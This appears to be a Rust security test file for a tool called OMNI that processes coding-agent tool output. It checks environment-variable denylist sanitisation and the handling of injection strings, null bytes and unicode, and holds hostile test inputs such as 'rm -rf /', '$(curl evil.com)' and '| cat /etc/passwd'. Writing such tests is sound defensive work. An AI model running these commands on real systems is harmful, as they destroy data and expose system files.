/// Security tests — verify OMNI does not introduce attack vectors.
use omni::pipeline::{classifier, composer, scorer};

fn run_pipeline(input: &str) -> String {
    let ctype = classifier::classify(input);
    let segments = scorer::score_segments(input, &ctype, None);
    let config = composer::ComposeConfig::default();
    let (output, _) = composer::compose(segments, None, &config, None, input, &ctype);
    output
}

#[test]
fn test_env_sanitization_denylist() {
    use omni::guard::env::{DENYLIST, sanitize_env};

    // Set some dangerous env vars (unsafe in Rust 2024)
    for var in DENYLIST.iter().take(3) {
        unsafe {
            std::env::set_var(var, "INJECTED_VALUE");
        }
    }

    let sanitized = sanitize_env();

    // Verify denylist vars are NOT in sanitized output
    for var in DENYLIST {
        assert!(
            !sanitized.iter().any(|(k, _)| k.eq_ignore_ascii_case(*var)),
            "Denylist variable {} should be removed by sanitize_env",
            var
        );
    }

    // Cleanup
    for var in DENYLIST.iter().take(3) {
        unsafe {
            std::env::remove_var(var);
        }
    }
}

#[test]
fn test_hook_does_not_execute_shell_strings() {
    // Input containing shell injection attempts
    let malicious_inputs = vec![
        "; rm -rf /",
        "$(curl evil.com)",
        "`whoami`",
        "| cat /etc/passwd",
        "&& shutdown -h now",
        "'; DROP TABLE sessions; --",
    ];

    for input in malicious_inputs {
        let output = run_pipeline(input);
        // Pipeline should treat these as plain text, never execute them
        // Output should just be the text itself (passthrough for short content)
        assert!(
            !output.is_empty() || input.trim().is_empty(),
            "Malicious input should be handled as text, not executed: {}",
            input
        );
    }
}

#[test]
fn test_pipeline_handles_null_bytes() {
    let input = "normal text\x00with null\x00bytes";
    let output = run_pipeline(input);
    // Should not crash, output should be non-empty
    assert!(!output.is_empty());
}

#[test]
fn test_pipeline_handles_extremely_long_lines() {
    let long_line = "a".repeat(100_000);
    let output = run_pipeline(&long_line);
    // Should not crash and should produce some output
    assert!(!output.is_empty());
}

#[test]
fn test_pipeline_handles_unicode_edge_cases() {
    let inputs = vec![
        "こんにちは世界",
        "🔥💀🎉 emoji lines\n🚀 rocket",
        "mixed مرحبا 你好 Привет",
        "\u{FEFF}BOM at start", // BOM character
        "line1\r\nwindows\r\nnewlines\r\n",
    ];

    for input in inputs {
        let output = run_pipeline(input);
        assert!(
            !output.is_empty(),
            "Unicode input should not crash pipeline: {:?}",
            &input[..input.len().min(30)]
        );
    }
}

#[test]
fn test_pipeline_deterministic() {
    let input =
        std::fs::read_to_string("tests/fixtures/git_diff_multi_file.txt").expect("fixture missing");

    let output1 = run_pipeline(&input);
    let output2 = run_pipeline(&input);

    assert_eq!(
        output1, output2,
        "Pipeline should be deterministic for same input"
    );
}

#[test]
fn test_env_sanitization_removes_dangerous_vars() {
    use omni::guard::env::{DENYLIST, sanitize_env};

    // Set beberapa dangerous vars
    unsafe {
        std::env::set_var("LD_PRELOAD", "malicious.so");
        std::env::set_var("BASH_ENV", "evil_script.sh");
        std::env::set_var("NODE_OPTIONS", "--require=evil");
    }

    let sanitized = sanitize_env();

    // Verify semua DENYLIST entries hilang
    for key in DENYLIST {
        assert!(
            !sanitized.iter().any(|(k, _)| k.eq_ignore_ascii_case(*key)),
            "DENYLIST entry '{}' should not be in sanitized env",
            key
        );
    }

    // Verify normal vars masih ada
    assert!(
        sanitized.iter().any(|(k, _)| k.to_uppercase() == "PATH"),
        "PATH should still be in sanitized env"
    );

    // Cleanup
    unsafe {
        std::env::remove_var("LD_PRELOAD");
        std::env::remove_var("BASH_ENV");
        std::env::remove_var("NODE_OPTIONS");
    }
}

#[test]
fn test_hook_handles_null_bytes_gracefully() {
    use omni::hooks::post_tool::process_payload;

    // Input dengan null bytes tidak boleh crash
    let malicious = "{\"tool_name\":\"Bash\",\"tool_response\":{\"content\":\"hello\0world\"}}";
    let result = process_payload(malicious, None, None);
    // Tidak crash adalah acceptance criteria — result bisa None atau Some
    let _ = result;
}

#[test]
fn test_dispatcher_catch_unwind_works() {
    // Test bahwa panic di dalam handler tidak propagate
    // Kita simulasi behavior catch_unwind di dispatcher.rs
    let result = std::panic::catch_unwind(|| {
        panic!("intentional panic for test");
    });

    assert!(result.is_err(), "Should have caught the panic");

    // Verifikasi dispatcher::run behavior (fail silently)
    let dispatcher_behavior = match result {
        Ok(_) => "should_not_happen",
        Err(_) => "caught_and_handled",
    };
    assert_eq!(dispatcher_behavior, "caught_and_handled");
}

#[test]
fn test_hook_json_escaping_quotes_and_newlines() {
    use omni::hooks::post_tool::process_payload;
    use serde_json::json;

    // Input dengan quotes dan newlines dalam content
    let tricky_content = "error: expected `\"` \nfound `\n` at line 42".repeat(30);
    let input = json!({
        "tool_name": "Bash",
        "tool_input": {"command": "cargo build"},
        "tool_response": {"content": tricky_content}
    });

    if let Some(output) = process_payload(&input.to_string(), None, None) {
        // Output harus valid JSON
        let parsed: serde_json::Value = serde_json::from_str(&output)
            .expect("Hook output must be valid JSON even with special chars");
        assert!(parsed["hookSpecificOutput"]["updatedResponse"].is_string());
    }
}
